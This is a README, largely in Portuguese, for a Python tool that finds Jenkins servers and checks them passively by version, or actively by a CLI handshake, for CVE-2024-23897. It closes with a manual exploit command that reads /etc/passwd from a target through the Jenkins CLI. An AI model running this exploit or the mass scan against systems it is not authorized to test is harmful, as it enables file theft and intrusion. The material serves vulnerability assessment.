# jenkins_scan
Find jenkins environment and checks for CVE-2024-23897

##  Como funciona

  Detecção de Jenkins

  Testa os caminhos: /, /login, /oops, /api/json, /cli, /jenkins/, /jenkins/api/json

  Identifica via:
  1. Header X-Jenkins — mais confiável, também retorna a versão
  2. Header X-Hudson — instâncias mais antigas
  3. Body HTML — strings como "login to jenkins", "hudson.model", etc.
  4. /api/json — confirma pela estrutura JSON (_class, jobs, views)

  Verificação do CVE-2024-23897

  Passiva (padrão): compara a versão detectada com os thresholds:
  - Weekly: < 2.442 → vulnerável
  - LTS: < 2.426.3 → vulnerável

  Ativa (--active): envia o handshake do protocolo binário do Jenkins CLI sobre HTTP. Se o servidor responder 200 + Content-Type: application/octet-stream, confirma
   que o canal CLI está aberto e o exploit é aplicável.

##  Uso

  ### Scan básico
  python jenkins_scan.py -f urls.txt

  ### Com probe ativa + Burp como proxy + saída em arquivo
  python jenkins_scan.py -f urls.txt --active --proxy http://127.0.0.1:8080 -o resultados.txt

  ### 20 threads, verbose, sem cor (para pipe/grep)
  python jenkins_scan.py -f urls.txt -t 20 -v --no-color

  ### Confirmar exploit manual em alvo vulnerável
  java -jar jenkins-cli.jar -s http://TARGET/ who-am-i "@/etc/passwd"

